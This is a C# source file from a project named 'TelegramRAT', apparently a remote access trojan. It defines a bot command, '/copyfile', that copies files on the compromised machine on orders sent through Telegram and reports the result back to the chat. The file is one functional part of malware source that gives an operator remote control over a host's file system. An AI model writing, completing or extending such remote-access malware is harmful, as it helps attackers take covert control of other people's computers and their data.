using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class CopyFileCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "copyfile";
    public override int ArgsCount => 2;
    public override string Description => "Copy file. First argument is file path (full or realtive), second is folder path. Type paths as in cmd.";
    public override string Example => "/copyfile \"My folder\\hello world.txt\" \"C:\\Users\\User\\Documents\\Some Folder\"";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            string sourceFile = fileSystemService.SanitizePath(model.Args[0]);
            string targetDir = fileSystemService.SanitizePath(model.Args[1]);

            if (fileSystemService.FileExists(sourceFile) && fileSystemService.DirectoryExists(targetDir))
            {
                string destination = Path.Combine(targetDir, Path.GetFileName(sourceFile));
                await Task.Run(() => fileSystemService.CopyFile(sourceFile, destination));
                await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
            else
            {
                if (!fileSystemService.FileExists(sourceFile))
                    await botClient.SendMessage(model.Message.Chat.Id, "This file does not exist!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                if (!fileSystemService.DirectoryExists(targetDir))
                    await botClient.SendMessage(model.Message.Chat.Id, "This path does not exist!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
